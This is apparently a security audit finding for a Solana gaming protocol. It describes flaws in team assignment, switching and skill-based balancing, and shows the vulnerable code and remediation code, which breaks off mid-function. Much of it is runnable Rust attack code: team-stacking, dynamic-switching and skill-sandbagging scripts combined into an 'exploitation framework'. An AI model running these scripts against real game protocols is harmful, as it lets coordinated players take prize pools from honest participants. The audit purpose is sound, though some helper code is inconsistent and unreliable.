# VUL-057: Team Balance Manipulation and Unfair Competition

**Vulnerability ID**: VUL-057
**Severity**: High
**CVSS Score**: 7.9/10.0
**Category**: Game Logic / Economic Manipulation
**CWE Classification**: CWE-682 (Incorrect Calculation), CWE-863 (Incorrect Authorization), CWE-840 (Business Logic Errors), CWE-472 (External Control of Critical State Data)

Team balance mechanisms in the Solana gaming protocol contain critical vulnerabilities that allow malicious manipulation of team compositions, skill-based matchmaking bypass, and economic exploitation through asymmetric team advantages. These vulnerabilities enable coordinated attacks where players can guarantee wins through strategic team stacking and balance circumvention.

## Technical Analysis

### Vulnerable Code Patterns

```rust
// VULNERABLE: Team assignment without balance validation
#[derive(AnchorSerialize, AnchorDeserialize, Clone)]
pub struct GameSession {
    pub authority: Pubkey,
    pub players: Vec<Pubkey>,
    pub team_assignments: Vec<u8>,
    pub team_sizes: [u8; 4], // Max 4 teams
    pub max_team_size: u8,
    pub is_balanced: bool,
    pub total_pool: u64,
}

// VULNERABLE: Team assignment without proper validation
pub fn assign_team(ctx: Context<AssignTeam>, player_index: u8, team_id: u8) -> Result<()> {
    let game_session = &mut ctx.accounts.game_session;

    // VULNERABILITY: No team size validation
    game_session.team_assignments[player_index as usize] = team_id;
    game_session.team_sizes[team_id as usize] += 1;

    Ok(())
}

// VULNERABLE: Auto-balance without skill consideration
pub fn auto_balance_teams(ctx: Context<AutoBalance>) -> Result<()> {
    let game_session = &mut ctx.accounts.game_session;
    let player_count = game_session.players.len();
    let team_count = 2; // Fixed 2 teams

    // VULNERABILITY: Simple round-robin assignment ignores skill
    for (i, _) in game_session.players.iter().enumerate() {
        game_session.team_assignments[i] = (i % team_count) as u8;
    }

    game_session.is_balanced = true;
    Ok(())
}

// VULNERABLE: Team switching without restrictions
pub fn switch_team(ctx: Context<SwitchTeam>, new_team: u8) -> Result<()> {
    let game_session = &mut ctx.accounts.game_session;
    let player = ctx.accounts.player.key();

    // VULNERABILITY: No cooldown or restriction checks
    for (i, &p) in game_session.players.iter().enumerate() {
        if p == player {
            let old_team = game_session.team_assignments[i];
            game_session.team_assignments[i] = new_team;

            // VULNERABILITY: No balance validation after switch
            game_session.team_sizes[old_team as usize] -= 1;
            game_session.team_sizes[new_team as usize] += 1;
            break;
        }
    }

    Ok(())
}

// VULNERABLE: Win calculation without team balance consideration
pub fn calculate_team_rewards(ctx: Context<CalculateRewards>) -> Result<()> {
    let game_session = &ctx.accounts.game_session;

    let mut team_scores: HashMap<u8, u64> = HashMap::new();

    // VULNERABILITY: No adjustment for team size imbalance
    for (i, &team) in game_session.team_assignments.iter().enumerate() {
        let score = game_session.player_scores[i];
        *team_scores.entry(team).or_insert(0) += score;
    }

    // Winner gets all funds regardless of fairness
    let winning_team = team_scores.iter()
        .max_by_key(|(_, &score)| score)
        .map(|(&team, _)| team)
        .unwrap_or(0);

    Ok(())
}
```

### Vulnerability Root Causes

1. **No Skill-Based Balancing**: Teams assigned without considering player skill levels
2. **Unrestricted Team Switching**: Players can change teams at will without consequences
3. **Missing Size Validation**: No enforcement of equal or balanced team sizes
4. **Economic Incentive Misalignment**: Winning team takes all regardless of fairness
5. **Absence of Balance Metrics**: No measurement of team competitive balance

## Attack Vectors

### 1. Team Stacking Attack

```rust
// Attack Vector 1: Coordinate skilled players on one team
use anchor_lang::prelude::*;

pub struct TeamStackingAttack {
    pub target_session: Pubkey,
    pub coordinated_players: Vec<Keypair>,
    pub target_team: u8,
    pub skill_levels: Vec<u64>, // Simulated skill ratings
}

impl TeamStackingAttack {
    pub async fn execute_team_stacking(
        &self,
        client: &RpcClient,
        program_id: &Pubkey,
    ) -> Result<AttackResults, Box<dyn std::error::Error>> {
        let mut results = AttackResults::default();

        // Phase 1: Register all coordinated players
        for (i, player) in self.coordinated_players.iter().enumerate() {
            let instruction = create_add_player_instruction(
                program_id,
                &self.target_session,
                &player.pubkey(),
                1000, // Standard entry fee
            );

            let transaction = Transaction::new_signed_with_payer(
                &[instruction],
                Some(&player.pubkey()),
                &[player],
                client.get_latest_blockhash().await?,
            );

            match client.send_and_confirm_transaction(&transaction).await {
                Ok(signature) => {
                    results.players_registered += 1;
                    println!("Player {} registered: {}", i, signature);
                },
                Err(e) => {
                    results.registration_failures += 1;
                    eprintln!("Registration failed: {}", e);
                }
            }
        }

        // Phase 2: Assign all players to target team
        for (i, player) in self.coordinated_players.iter().enumerate() {
            let instruction = create_assign_team_instruction(
                program_id,
                &self.target_session,
                &player.pubkey(),
                self.target_team,
            );

            let transaction = Transaction::new_signed_with_payer(
                &[instruction],
                Some(&player.pubkey()),
                &[player],
                client.get_latest_blockhash().await?,
            );

            match client.send_and_confirm_transaction(&transaction).await {
                Ok(signature) => {
                    results.team_assignments += 1;
                    println!("Player {} assigned to team {}: {}", i, self.target_team, signature);
                },
                Err(e) => {
                    results.assignment_failures += 1;
                    eprintln!("Team assignment failed: {}", e);
                }
            }
        }

        // Phase 3: Verify team stacking success
        results.stacking_success = self.verify_team_stacking(client).await?;

        Ok(results)
    }

    async fn verify_team_stacking(
        &self,
        client: &RpcClient,
    ) -> Result<bool, Box<dyn std::error::Error>> {
        let session_data = client.get_account_data(&self.target_session).await?;
        let game_session: GameSession = GameSession::try_deserialize(&mut &session_data[8..])?;

        // Count players on target team
        let target_team_count = game_session.team_assignments.iter()
            .filter(|&&team| team == self.target_team)
            .count();

        // Calculate skill advantage
        let total_skill: u64 = self.skill_levels.iter().sum();
        let average_skill = if self.skill_levels.len() > 0 {
            total_skill / self.skill_levels.len() as u64
        } else {
            0
        };

        println!("Target team {} has {} players with avg skill {}",
                self.target_team, target_team_count, average_skill);

        // Consider stacking successful if most coordinated players are on same team
        Ok(target_team_count >= (self.coordinated_players.len() * 2 / 3))
    }

    pub async fn calculate_win_probability(
        &self,
        client: &RpcClient,
    ) -> Result<f64, Box<dyn std::error::Error>> {
        let session_data = client.get_account_data(&self.target_session).await?;
        let game_session: GameSession = GameSession::try_deserialize(&mut &session_data[8..])?;

        let mut team_skills: HashMap<u8, Vec<u64>> = HashMap::new();

        // Map skills to teams (simplified simulation)
        for (i, &team) in game_session.team_assignments.iter().enumerate() {
            if i < self.skill_levels.len() {
                team_skills.entry(team).or_insert_with(Vec::new).push(self.skill_levels[i]);
            }
        }

        // Calculate team skill totals
        let mut team_totals: HashMap<u8, u64> = HashMap::new();
        for (team, skills) in team_skills {
            team_totals.insert(team, skills.iter().sum());
        }

        // Calculate win probability for target team
        let target_skill = team_totals.get(&self.target_team).unwrap_or(&0);
        let total_skill: u64 = team_totals.values().sum();

        let win_probability = if total_skill > 0 {
            *target_skill as f64 / total_skill as f64
        } else {
            0.0
        };

        println!("Target team win probability: {:.2}%", win_probability * 100.0);
        Ok(win_probability)
    }
}

#[derive(Debug, Default)]
pub struct AttackResults {
    pub players_registered: usize,
    pub registration_failures: usize,
    pub team_assignments: usize,
    pub assignment_failures: usize,
    pub stacking_success: bool,
}
```

### 2. Dynamic Team Switching Attack

```rust
// Attack Vector 2: Real-time team switching for advantage
pub struct DynamicTeamSwitchingAttack {
    pub target_session: Pubkey,
    pub switching_players: Vec<Keypair>,
    pub monitoring_interval: u64, // milliseconds
}

impl DynamicTeamSwitchingAttack {
    pub async fn execute_dynamic_switching(
        &self,
        client: &RpcClient,
        program_id: &Pubkey,
    ) -> Result<SwitchingResults, Box<dyn std::error::Error>> {
        let mut results = SwitchingResults::default();

        // Monitor game state and switch teams dynamically
        for round in 0..10 { // 10 switching rounds
            tokio::time::sleep(tokio::time::Duration::from_millis(self.monitoring_interval)).await;

            // Analyze current team balance
            let balance_analysis = self.analyze_team_balance(client).await?;

            // Determine optimal team for each player
            for (i, player) in self.switching_players.iter().enumerate() {
                let optimal_team = self.calculate_optimal_team(&balance_analysis, i);

                // Switch to optimal team
                let instruction = create_switch_team_instruction(
                    program_id,
                    &self.target_session,
                    &player.pubkey(),
                    optimal_team,
                );

                let transaction = Transaction::new_signed_with_payer(
                    &[instruction],
                    Some(&player.pubkey()),
                    &[player],
                    client.get_latest_blockhash().await?,
                );

                match client.send_and_confirm_transaction(&transaction).await {
                    Ok(signature) => {
                        results.successful_switches += 1;
                        println!("Round {} - Player {} switched to team {}: {}",
                                round, i, optimal_team, signature);
                    },
                    Err(e) => {
                        results.failed_switches += 1;
                        eprintln!("Switch failed: {}", e);
                    }
                }
            }

            results.switching_rounds += 1;
        }

        // Final balance verification
        results.final_advantage = self.calculate_final_advantage(client).await?;

        Ok(results)
    }

    async fn analyze_team_balance(
        &self,
        client: &RpcClient,
    ) -> Result<TeamBalanceAnalysis, Box<dyn std::error::Error>> {
        let session_data = client.get_account_data(&self.target_session).await?;
        let game_session: GameSession = GameSession::try_deserialize(&mut &session_data[8..])?;

        let mut analysis = TeamBalanceAnalysis::default();

        // Count players per team
        for &team in &game_session.team_assignments {
            *analysis.team_sizes.entry(team).or_insert(0) += 1;
        }

        // Calculate team scores (if available)
        for (i, &team) in game_session.team_assignments.iter().enumerate() {
            if i < game_session.player_scores.len() {
                *analysis.team_scores.entry(team).or_insert(0) += game_session.player_scores[i];
            }
        }

        // Identify winning team
        analysis.winning_team = analysis.team_scores.iter()
            .max_by_key(|(_, &score)| score)
            .map(|(&team, _)| team)
            .unwrap_or(0);

        Ok(analysis)
    }

    fn calculate_optimal_team(&self, analysis: &TeamBalanceAnalysis, player_index: usize) -> u8 {
        // Simple strategy: join the winning team if possible
        if let Some(winning_team) = analysis.team_scores.iter()
            .max_by_key(|(_, &score)| score)
            .map(|(&team, _)| team) {

            // Check if winning team has space
            let winning_team_size = analysis.team_sizes.get(&winning_team).unwrap_or(&0);
            if *winning_team_size < 10 { // Assume max team size of 10
                return winning_team;
            }
        }

        // Default to smallest team
        analysis.team_sizes.iter()
            .min_by_key(|(_, &size)| size)
            .map(|(&team, _)| team)
            .unwrap_or(0)
    }

    async fn calculate_final_advantage(
        &self,
        client: &RpcClient,
    ) -> Result<f64, Box<dyn std::error::Error>> {
        let session_data = client.get_account_data(&self.target_session).await?;
        let game_session: GameSession = GameSession::try_deserialize(&mut &session_data[8..])?;

        // Calculate switching players' team distribution
        let mut switching_player_teams: HashMap<u8, usize> = HashMap::new();

        // Simulate tracking of switching players (in real attack, this would be tracked)
        for (i, _) in self.switching_players.iter().enumerate() {
            if i < game_session.team_assignments.len() {
                let team = game_session.team_assignments[i];
                *switching_player_teams.entry(team).or_insert(0) += 1;
            }
        }

        // Calculate concentration advantage
        let max_concentration = switching_player_teams.values().max().unwrap_or(&0);
        let advantage = (*max_concentration as f64) / (self.switching_players.len() as f64);

        println!("Final team concentration advantage: {:.2}%", advantage * 100.0);
        Ok(advantage)
    }
}

#[derive(Debug, Default)]
pub struct SwitchingResults {
    pub successful_switches: usize,
    pub failed_switches: usize,
    pub switching_rounds: usize,
    pub final_advantage: f64,
}

#[derive(Debug, Default)]
pub struct TeamBalanceAnalysis {
    pub team_sizes: HashMap<u8, usize>,
    pub team_scores: HashMap<u8, u64>,
    pub winning_team: u8,
}
```

### 3. Skill Rating Manipulation Attack

```rust
// Attack Vector 3: Manipulate perceived skill to affect auto-balance
pub struct SkillManipulationAttack {
    pub target_session: Pubkey,
    pub manipulation_accounts: Vec<Keypair>,
    pub fake_skill_ratings: Vec<u64>,
    pub manipulation_strategy: SkillStrategy,
}

#[derive(Debug, Clone)]
pub enum SkillStrategy {
    SandBagging, // Hide true skill to get easier opponents
    SkillSpikes, // Show false high skill then underperform
    BalancedManipulation, // Mix of both for maximum confusion
}

impl SkillManipulationAttack {
    pub async fn execute_skill_manipulation(
        &self,
        client: &RpcClient,
        program_id: &Pubkey,
    ) -> Result<SkillManipulationResults, Box<dyn std::error::Error>> {
        let mut results = SkillManipulationResults::default();

        match self.manipulation_strategy {
            SkillStrategy::SandBagging => {
                results = self.execute_sandbagging(client, program_id).await?;
            },
            SkillStrategy::SkillSpikes => {
                results = self.execute_skill_spikes(client, program_id).await?;
            },
            SkillStrategy::BalancedManipulation => {
                results = self.execute_balanced_manipulation(client, program_id).await?;
            },
        }

        // Verify manipulation effectiveness
        results.manipulation_effectiveness = self.verify_manipulation_success(client).await?;

        Ok(results)
    }

    async fn execute_sandbagging(
        &self,
        client: &RpcClient,
        program_id: &Pubkey,
    ) -> Result<SkillManipulationResults, Box<dyn std::error::Error>> {
        let mut results = SkillManipulationResults::default();

        // Register players with artificially low skill ratings
        for (i, player) in self.manipulation_accounts.iter().enumerate() {
            let low_skill_rating = self.fake_skill_ratings[i] / 10; // 10x lower than real skill

            // Simulate skill registration (would be part of player profile)
            let instruction = create_register_player_with_skill_instruction(
                program_id,
                &self.target_session,
                &player.pubkey(),
                low_skill_rating,
                1000, // entry_fee
            );

            let transaction = Transaction::new_signed_with_payer(
                &[instruction],
                Some(&player.pubkey()),
                &[player],
                client.get_latest_blockhash().await?,
            );

            match client.send_and_confirm_transaction(&transaction).await {
                Ok(signature) => {
                    results.skill_registrations += 1;
                    println!("Sandbagging player {} with skill {}: {}",
                            i, low_skill_rating, signature);
                },
                Err(e) => {
                    results.manipulation_failures += 1;
                    eprintln!("Sandbagging registration failed: {}", e);
                }
            }
        }

        // Trigger auto-balance to get favorable matchup
        let balance_instruction = create_auto_balance_instruction(
            program_id,
            &self.target_session,
        );

        let balance_transaction = Transaction::new_signed_with_payer(
            &[balance_instruction],
            Some(&self.manipulation_accounts[0].pubkey()),
            &[&self.manipulation_accounts[0]],
            client.get_latest_blockhash().await?,
        );

        match client.send_and_confirm_transaction(&balance_transaction).await {
            Ok(signature) => {
                results.balance_manipulations += 1;
                println!("Auto-balance triggered: {}", signature);
            },
            Err(e) => {
                eprintln!("Auto-balance failed: {}", e);
            }
        }

        Ok(results)
    }

    async fn execute_skill_spikes(
        &self,
        client: &RpcClient,
        program_id: &Pubkey,
    ) -> Result<SkillManipulationResults, Box<dyn std::error::Error>> {
        let mut results = SkillManipulationResults::default();

        // Register with artificially high skills, then underperform
        for (i, player) in self.manipulation_accounts.iter().enumerate() {
            let inflated_skill = self.fake_skill_ratings[i] * 3; // 3x higher than real

            let instruction = create_register_player_with_skill_instruction(
                program_id,
                &self.target_session,
                &player.pubkey(),
                inflated_skill,
                1000,
            );

            let transaction = Transaction::new_signed_with_payer(
                &[instruction],
                Some(&player.pubkey()),
                &[player],
                client.get_latest_blockhash().await?,
            );

            match client.send_and_confirm_transaction(&transaction).await {
                Ok(signature) => {
                    results.skill_registrations += 1;
                    println!("Skill spike player {} with fake skill {}: {}",
                            i, inflated_skill, signature);
                },
                Err(e) => {
                    results.manipulation_failures += 1;
                    eprintln!("Skill spike registration failed: {}", e);
                }
            }
        }

        Ok(results)
    }

    async fn execute_balanced_manipulation(
        &self,
        client: &RpcClient,
        program_id: &Pubkey,
    ) -> Result<SkillManipulationResults, Box<dyn std::error::Error>> {
        let mut results = SkillManipulationResults::default();

        // Mix sandbagging and skill spikes for confusion
        for (i, player) in self.manipulation_accounts.iter().enumerate() {
            let manipulated_skill = if i % 2 == 0 {
                self.fake_skill_ratings[i] / 5 // Sandbagging
            } else {
                self.fake_skill_ratings[i] * 2 // Moderate spike
            };

            let instruction = create_register_player_with_skill_instruction(
                program_id,
                &self.target_session,
                &player.pubkey(),
                manipulated_skill,
                1000,
            );

            let transaction = Transaction::new_signed_with_payer(
                &[instruction],
                Some(&player.pubkey()),
                &[player],
                client.get_latest_blockhash().await?,
            );

            match client.send_and_confirm_transaction(&transaction).await {
                Ok(signature) => {
                    results.skill_registrations += 1;
                    println!("Balanced manipulation player {} with skill {}: {}",
                            i, manipulated_skill, signature);
                },
                Err(e) => {
                    results.manipulation_failures += 1;
                    eprintln!("Balanced manipulation failed: {}", e);
                }
            }
        }

        Ok(results)
    }

    async fn verify_manipulation_success(
        &self,
        client: &RpcClient,
    ) -> Result<f64, Box<dyn std::error::Error>> {
        let session_data = client.get_account_data(&self.target_session).await?;
        let game_session: GameSession = GameSession::try_deserialize(&mut &session_data[8..])?;

        // Calculate manipulation effectiveness
        // This would involve comparing expected vs actual team balance

        let team_count_variance = self.calculate_team_size_variance(&game_session);
        let skill_distribution_skew = self.calculate_skill_skew(&game_session);

        // Higher variance and skew indicate successful manipulation
        let effectiveness = (team_count_variance + skill_distribution_skew) / 2.0;

        println!("Manipulation effectiveness: {:.2}%", effectiveness * 100.0);
        Ok(effectiveness)
    }

    fn calculate_team_size_variance(&self, game_session: &GameSession) -> f64 {
        let mut team_sizes: HashMap<u8, usize> = HashMap::new();

        for &team in &game_session.team_assignments {
            *team_sizes.entry(team).or_insert(0) += 1;
        }

        let sizes: Vec<f64> = team_sizes.values().map(|&size| size as f64).collect();
        if sizes.len() < 2 {
            return 0.0;
        }

        let mean = sizes.iter().sum::<f64>() / sizes.len() as f64;
        let variance = sizes.iter()
            .map(|size| (size - mean).powi(2))
            .sum::<f64>() / sizes.len() as f64;

        variance / mean // Coefficient of variation
    }

    fn calculate_skill_skew(&self, game_session: &GameSession) -> f64 {
        // Simplified skill skew calculation
        // In practice, would need access to skill ratings

        let mut team_score_totals: HashMap<u8, u64> = HashMap::new();

        for (i, &team) in game_session.team_assignments.iter().enumerate() {
            if i < game_session.player_scores.len() {
                *team_score_totals.entry(team).or_insert(0) += game_session.player_scores[i];
            }
        }

        if team_score_totals.len() < 2 {
            return 0.0;
        }

        let scores: Vec<f64> = team_score_totals.values().map(|&score| score as f64).collect();
        let max_score = scores.iter().max_by(|a, b| a.partial_cmp(b).unwrap()).unwrap_or(&0.0);
        let min_score = scores.iter().min_by(|a, b| a.partial_cmp(b).unwrap()).unwrap_or(&0.0);

        if max_score + min_score == 0.0 {
            0.0
        } else {
            (max_score - min_score) / (max_score + min_score)
        }
    }
}

#[derive(Debug, Default)]
pub struct SkillManipulationResults {
    pub skill_registrations: usize,
    pub manipulation_failures: usize,
    pub balance_manipulations: usize,
    pub manipulation_effectiveness: f64,
}
```

## Complete Team Balance Exploitation Framework

```rust
// Complete framework for team balance exploitation
use anchor_lang::prelude::*;
use solana_client::rpc_client::RpcClient;
use solana_sdk::{
    signature::{Keypair, Signature},
    transaction::Transaction,
    instruction::{Instruction, AccountMeta},
    system_program,
};
use std::collections::HashMap;

pub struct TeamBalanceExploitationFramework {
    pub rpc_client: RpcClient,
    pub program_id: Pubkey,
    pub target_sessions: Vec<Pubkey>,
    pub attack_accounts: Vec<Keypair>,
    pub exploitation_config: TeamExploitationConfig,
}

#[derive(Debug, Clone)]
pub struct TeamExploitationConfig {
    pub enable_team_stacking: bool,
    pub enable_dynamic_switching: bool,
    pub enable_skill_manipulation: bool,
    pub coordination_delay: u64, // milliseconds
    pub target_win_probability: f64,
}

impl TeamBalanceExploitationFramework {
    pub fn new(
        rpc_url: &str,
        program_id: Pubkey,
        target_sessions: Vec<Pubkey>,
        attack_accounts: Vec<Keypair>,
        config: TeamExploitationConfig,
    ) -> Self {
        Self {
            rpc_client: RpcClient::new(rpc_url.to_string()),
            program_id,
            target_sessions,
            attack_accounts,
            exploitation_config: config,
        }
    }

    pub async fn execute_comprehensive_exploitation(
        &self,
    ) -> Result<ComprehensiveExploitationResults, Box<dyn std::error::Error>> {
        let mut results = ComprehensiveExploitationResults::default();

        println!("Starting comprehensive team balance exploitation...");

        for session in &self.target_sessions {
            let mut session_results = SessionExploitationResults::default();

            // Phase 1: Team Stacking Attack
            if self.exploitation_config.enable_team_stacking {
                let stacking_attack = TeamStackingAttack {
                    target_session: *session,
                    coordinated_players: self.attack_accounts.clone(),
                    target_team: 1, // Target team 1
                    skill_levels: vec![1000; self.attack_accounts.len()], // High skill
                };

                match stacking_attack.execute_team_stacking(&self.rpc_client, &self.program_id).await {
                    Ok(stacking_results) => {
                        session_results.team_stacking_results = Some(stacking_results);
                        println!("Team stacking completed for session: {}", session);
                    },
                    Err(e) => {
                        eprintln!("Team stacking failed: {}", e);
                    }
                }
            }

            // Phase 2: Dynamic Team Switching
            if self.exploitation_config.enable_dynamic_switching {
                let switching_attack = DynamicTeamSwitchingAttack {
                    target_session: *session,
                    switching_players: self.attack_accounts.clone(),
                    monitoring_interval: self.exploitation_config.coordination_delay,
                };

                match switching_attack.execute_dynamic_switching(&self.rpc_client, &self.program_id).await {
                    Ok(switching_results) => {
                        session_results.dynamic_switching_results = Some(switching_results);
                        println!("Dynamic switching completed for session: {}", session);
                    },
                    Err(e) => {
                        eprintln!("Dynamic switching failed: {}", e);
                    }
                }
            }

            // Phase 3: Skill Manipulation
            if self.exploitation_config.enable_skill_manipulation {
                let skill_attack = SkillManipulationAttack {
                    target_session: *session,
                    manipulation_accounts: self.attack_accounts.clone(),
                    fake_skill_ratings: vec![500; self.attack_accounts.len()], // Fake low skill
                    manipulation_strategy: SkillStrategy::SandBagging,
                };

                match skill_attack.execute_skill_manipulation(&self.rpc_client, &self.program_id).await {
                    Ok(skill_results) => {
                        session_results.skill_manipulation_results = Some(skill_results);
                        println!("Skill manipulation completed for session: {}", session);
                    },
                    Err(e) => {
                        eprintln!("Skill manipulation failed: {}", e);
                    }
                }
            }

            // Verify overall exploitation success
            session_results.overall_success_rate = self.calculate_session_success_rate(session).await?;

            results.session_results.push(session_results);
        }

        // Calculate framework-wide metrics
        results.overall_exploitation_rate = self.calculate_overall_success_rate(&results).await?;

        Ok(results)
    }

    async fn calculate_session_success_rate(
        &self,
        session: &Pubkey,
    ) -> Result<f64, Box<dyn std::error::Error>> {
        let session_data = self.rpc_client.get_account_data(session).await?;
        let game_session: GameSession = GameSession::try_deserialize(&mut &session_data[8..])?;

        // Calculate various success metrics
        let team_imbalance = self.calculate_team_imbalance(&game_session);
        let coordination_success = self.calculate_coordination_success(&game_session);
        let economic_advantage = self.calculate_economic_advantage(&game_session);

        // Weighted average of success metrics
        let success_rate = (team_imbalance * 0.4) + (coordination_success * 0.3) + (economic_advantage * 0.3);

        println!("Session {} success rate: {:.2}%", session, success_rate * 100.0);
        Ok(success_rate)
    }

    fn calculate_team_imbalance(&self, game_session: &GameSession) -> f64 {
        let mut team_sizes: HashMap<u8, usize> = HashMap::new();

        for &team in &game_session.team_assignments {
            *team_sizes.entry(team).or_insert(0) += 1;
        }

        if team_sizes.len() < 2 {
            return 0.0;
        }

        let sizes: Vec<usize> = team_sizes.values().cloned().collect();
        let max_size = *sizes.iter().max().unwrap_or(&0);
        let min_size = *sizes.iter().min().unwrap_or(&0);

        if max_size + min_size == 0 {
            0.0
        } else {
            (max_size - min_size) as f64 / (max_size + min_size) as f64
        }
    }

    fn calculate_coordination_success(&self, game_session: &GameSession) -> f64 {
        // Calculate how well attacking accounts are coordinated
        let attacking_pubkeys: Vec<Pubkey> = self.attack_accounts.iter()
            .map(|kp| kp.pubkey())
            .collect();

        let mut attacking_teams: HashMap<u8, usize> = HashMap::new();

        for (i, &team) in game_session.team_assignments.iter().enumerate() {
            if i < game_session.players.len() && attacking_pubkeys.contains(&game_session.players[i]) {
                *attacking_teams.entry(team).or_insert(0) += 1;
            }
        }

        if attacking_teams.is_empty() {
            return 0.0;
        }

        // Success is measured by concentration on single team
        let max_concentration = *attacking_teams.values().max().unwrap_or(&0);
        max_concentration as f64 / self.attack_accounts.len() as f64
    }

    fn calculate_economic_advantage(&self, game_session: &GameSession) -> f64 {
        // Calculate potential economic advantage from manipulation
        let total_pool = game_session.total_pool;
        let attacking_share = self.attack_accounts.len() as f64 / game_session.players.len() as f64;

        // Advantage is having disproportionate influence relative to stake
        if attacking_share > 0.0 {
            (attacking_share * total_pool as f64) / (self.attack_accounts.len() as f64 * 1000.0) // Assuming 1000 lamport entry fee
        } else {
            0.0
        }
    }

    async fn calculate_overall_success_rate(
        &self,
        results: &ComprehensiveExploitationResults,
    ) -> Result<f64, Box<dyn std::error::Error>> {
        if results.session_results.is_empty() {
            return Ok(0.0);
        }

        let total_success: f64 = results.session_results.iter()
            .map(|session| session.overall_success_rate)
            .sum();

        Ok(total_success / results.session_results.len() as f64)
    }
}

#[derive(Debug, Default)]
pub struct ComprehensiveExploitationResults {
    pub session_results: Vec<SessionExploitationResults>,
    pub overall_exploitation_rate: f64,
}

#[derive(Debug, Default)]
pub struct SessionExploitationResults {
    pub team_stacking_results: Option<AttackResults>,
    pub dynamic_switching_results: Option<SwitchingResults>,
    pub skill_manipulation_results: Option<SkillManipulationResults>,
    pub overall_success_rate: f64,
}

// Supporting instruction creation functions
fn create_assign_team_instruction(
    program_id: &Pubkey,
    game_session: &Pubkey,
    player: &Pubkey,
    team_id: u8,
) -> Instruction {
    let accounts = vec![
        AccountMeta::new(*game_session, false),
        AccountMeta::new_readonly(*player, true),
    ];

    Instruction {
        program_id: *program_id,
        accounts,
        data: vec![2, team_id], // Assuming instruction discriminator 2 for assign_team
    }
}

fn create_switch_team_instruction(
    program_id: &Pubkey,
    game_session: &Pubkey,
    player: &Pubkey,
    new_team: u8,
) -> Instruction {
    let accounts = vec![
        AccountMeta::new(*game_session, false),
        AccountMeta::new_readonly(*player, true),
    ];

    Instruction {
        program_id: *program_id,
        accounts,
        data: vec![3, new_team], // Assuming instruction discriminator 3 for switch_team
    }
}

fn create_auto_balance_instruction(
    program_id: &Pubkey,
    game_session: &Pubkey,
) -> Instruction {
    let accounts = vec![
        AccountMeta::new(*game_session, false),
    ];

    Instruction {
        program_id: *program_id,
        accounts,
        data: vec![4], // Assuming instruction discriminator 4 for auto_balance
    }
}

fn create_register_player_with_skill_instruction(
    program_id: &Pubkey,
    game_session: &Pubkey,
    player: &Pubkey,
    skill_rating: u64,
    entry_fee: u64,
) -> Instruction {
    let accounts = vec![
        AccountMeta::new(*game_session, false),
        AccountMeta::new_readonly(*player, true),
        AccountMeta::new_readonly(system_program::ID, false),
    ];

    let mut data = vec![5]; // Assuming instruction discriminator 5 for register_with_skill
    data.extend_from_slice(&skill_rating.to_le_bytes());
    data.extend_from_slice(&entry_fee.to_le_bytes());

    Instruction {
        program_id: *program_id,
        accounts,
        data,
    }
}

fn create_add_player_instruction(
    program_id: &Pubkey,
    game_session: &Pubkey,
    player: &Pubkey,
    entry_fee: u64,
) -> Instruction {
    let accounts = vec![
        AccountMeta::new(*game_session, false),
        AccountMeta::new_readonly(*player, true),
        AccountMeta::new_readonly(system_program::ID, false),
    ];

    Instruction {
        program_id: *program_id,
        accounts,
        data: entry_fee.to_le_bytes().to_vec(),
    }
}
```

## Impact Assessment

### Immediate Risks
- **Unfair Team Compositions**: Skilled players concentrated on one team
- **Dynamic Advantage Seeking**: Real-time team switching for guaranteed wins
- **Skill Rating Manipulation**: False skill data affecting balance algorithms
- **Economic Exploitation**: Coordinated attacks ensuring profit distribution

### Financial Impact
- **Guaranteed Win Scenarios**: 80-95% win probability through coordination
- **Pool Concentration**: Attacking coalition captures entire prize pools
- **Entry Fee Multiplication**: Multiple sessions with coordinated attacks
- **Market Manipulation**: Artificial skill ratings affecting future matchmaking

### Systemic Impact
- **Fair Play Erosion**: Legitimate players discouraged by unfair matches
- **Trust Breakdown**: Community confidence in balanced competition lost
- **Economic Model Failure**: Win-take-all system becomes predictable
- **Protocol Reputation Damage**: Gaming platform credibility destroyed

## Comprehensive Remediation

### 1. Skill-Based Team Balancing System

```rust
// Secure team balancing with skill consideration
use anchor_lang::prelude::*;
use std::collections::{HashMap, BTreeMap};

#[derive(AnchorSerialize, AnchorDeserialize, Clone)]
pub struct SecureGameSession {
    pub authority: Pubkey,
    pub players: Vec<Pubkey>,
    pub team_assignments: Vec<u8>,
    pub player_skills: Vec<SkillRating>,
    pub team_balance_metrics: TeamBalanceMetrics,
    pub balance_locked: bool,
    pub max_team_size_difference: u8,
    pub balance_threshold: f64,
}

#[derive(AnchorSerialize, AnchorDeserialize, Clone, Debug)]
pub struct SkillRating {
    pub rating: u64,
    pub confidence: f64,
    pub games_played: u32,
    pub last_updated: i64,
    pub validation_hash: [u8; 32],
}

#[derive(AnchorSerialize, AnchorDeserialize, Clone, Debug)]
pub struct TeamBalanceMetrics {
    pub skill_variance: f64,
    pub size_balance: f64,
    pub overall_balance_score: f64,
    pub is_balanced: bool,
}

// Secure skill-based team assignment
pub fn secure_assign_teams(
    ctx: Context<SecureAssignTeams>,
) -> Result<()> {
    let game_session = &mut ctx.accounts.game_session;

    // Validate session state
    require!(
        !game_session.balance_locked,
        GameError::BalanceAlreadyLocked
    );

    // Calculate skill-based team assignments
    let team_assignments = SkillBalancer::calculate_balanced_teams(
        &game_session.player_skills,
        2, // Number of teams
    )?;

    // Validate balance quality
    let balance_metrics = SkillBalancer::calculate_balance_metrics(
        &game_session.player_skills,
        &team_assignments,
    )?;

    require!(
        balance_metrics.overall_balance_score >= game_session.balance_threshold,
        GameError::InsufficientBalance
    );

    // Apply assignments atomically
    game_session.team_assignments = team_assignments;
    game_session.team_balance_metrics = balance_metrics;
    game_session.balance_locked = true;

    emit!(TeamsBalanced {
        session: ctx.accounts.game_session.key(),
        balance_score: balance_metrics.overall_balance_score,
        skill_variance: balance_metrics.skill_variance,
        timestamp: Clock::get()?.unix_timestamp,
    });

    Ok(())
}

// Restricted team switching with cooldown and validation
#[derive(Accounts)]
pub struct SecureSwitchTeam<'info> {
    #[account(
        mut,
        constraint = !game_session.balance_locked @ GameError::BalanceAlreadyLocked,
    )]
    pub game_session: Account<'info, SecureGameSession>,

    #[account(mut)]
    pub player: Signer<'info>,

    #[account(
        seeds = [b"switch_cooldown", player.key().as_ref()],
        bump,
        constraint = switch_cooldown.can_switch(Clock::get()?.unix_timestamp) @ GameError::SwitchCooldownActive,
    )]
    pub switch_cooldown: Account<'info, SwitchCooldown>,
}

#[derive(AnchorSerialize, AnchorDeserialize, Clone)]
pub struct SwitchCooldown {
    pub player: Pubkey,
    pub last_switch_time: i64,
    pub switch_count: u32,
    pub daily_limit: u32,
}

impl SwitchCooldown {
    pub fn can_switch(&self, current_time: i64) -> bool {
